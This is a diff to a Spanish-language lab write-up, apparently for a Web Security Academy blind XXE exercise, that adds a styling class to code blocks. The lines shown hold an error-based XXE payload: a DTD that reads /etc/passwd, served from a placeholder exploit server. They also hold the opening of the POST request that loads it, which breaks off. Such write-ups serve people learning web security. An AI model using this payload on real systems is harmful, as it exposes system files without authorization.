@@ -23,7 +23,7 @@ tags:
 
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
-<pre><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
+<pre class="payload"><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
 %eval;
 %error;</code></pre>
@@ -35,7 +35,7 @@ tags:
 File `/exploit.dtd`, Body = el DTD, **Store** → `https://EXPLOIT.exploit-server.net/exploit.dtd`.
 
 ### 3. La request que carga el DTD
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
